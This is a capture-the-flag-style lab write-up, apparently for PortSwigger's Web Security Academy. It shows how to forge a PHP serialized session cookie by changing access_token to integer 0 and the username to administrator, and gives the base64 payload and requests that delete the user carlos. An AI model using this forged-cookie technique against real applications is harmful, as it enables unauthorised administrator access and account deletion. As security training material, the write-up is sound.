# Modifying Serialized Data Types


**Difficulty:** Practitioner

**Status:** Solved



## Overview



This lab uses a PHP serialization-based session mechanism that is vulnerable to authentication bypass.



The goal is to modify the serialized session object to impersonate the `administrator` user and then delete the user `carlos`.



---



## Initial Credentials



```text

wiener:peter
```



After logging in, inspect the session cookie in:



```text

Burp Suite → Proxy → HTTP history
```



---



## Understanding the Serialized Object



After decoding the session cookie, the serialized object contains properties similar to:



```text

O:4:"User":2:{s:8:"username";s:5:"wiener";s:12:"access_token";s:32:"...";}



```



PHP serialization uses different prefixes to represent different data types:




```text

s:   → string

i:   → integer

b:   → boolean

O:   → object
```



For example:



```text



s:32:"value";

```



represents a string, while:



```text

i:0;

```



represents the integer `0`.



---



## Exploitation



The application checks the supplied `access_token` against the expected token.




Instead of obtaining the administrator's real token, we can exploit unsafe type handling by changing the **data type** of the serialized 
value.



The original `access_token` is a string:



```text

s:12:"access_token";s:32:"...";

```



Change it to an integer:



```text

s:12:"access_token";i:0;

```



Also change the username to `administrator`.



The final serialized object is:



```text

O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

```



### Important



Using:




```text

b:0;

```




(Boolean `false`) does **not** work for this lab.



The required value is:



```text

i:0;

```



(Integer `0`).



---



## Encode the Payload



Base64-encode the final serialized object:



```text

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

```



Replace the existing session cookie:





```http

Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

```



Then request:



```http

GET /admin HTTP/2

```



The modified session should now provide administrator access.



---



## Delete Carlos



Use the administrator privileges to access:



```http

GET /admin/delete?username=carlos HTTP/2

```



The lab is then solved.



---



## Key Takeaways



* Session data can contain serialized PHP objects.

* Serialized data includes explicit type information.

* Changing a value's **type**, rather than just its value, can sometimes bypass security checks.

* `s:` represents a string.


* `i:` represents an integer.

* `b:` represents a boolean.

* In this lab, changing the `access_token` from a string to integer `0` enables the authentication bypass.

* Always inspect serialized session data carefully when investigating insecure deserialization.



## Exploitation Flow



```text

Login as wiener

      ↓

Capture session cookie

      ↓

Decode Base64

      ↓

Modify username → administrator

      ↓

Change access_token: string → integer 0


      ↓

Re-encode with Base64

      ↓

Replace session cookie

      ↓

Access /admin


      ↓


Delete /admin/delete?username=carlos

```


## Reference




PortSwigger Web Security Academy:


https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types
